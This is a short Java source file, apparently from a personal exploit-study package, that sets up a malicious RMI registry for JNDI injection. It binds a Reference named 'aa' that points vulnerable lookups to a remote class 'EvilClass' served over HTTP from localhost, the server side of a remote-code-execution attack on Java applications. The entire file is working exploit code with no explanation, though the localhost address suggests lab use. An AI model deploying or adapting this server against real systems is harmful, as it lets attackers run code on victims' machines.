package com.yyjccc.jndi.JNDI.exp;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Refer {
	public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
		String url = "http://127.0.0.1:8080/";
		Registry registry = LocateRegistry.createRegistry(1099);
		System.out.println("Registry start");
		Reference reference = new Reference("test", "EvilClass", url);
		ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
		registry.bind("aa",referenceWrapper);
	}
}
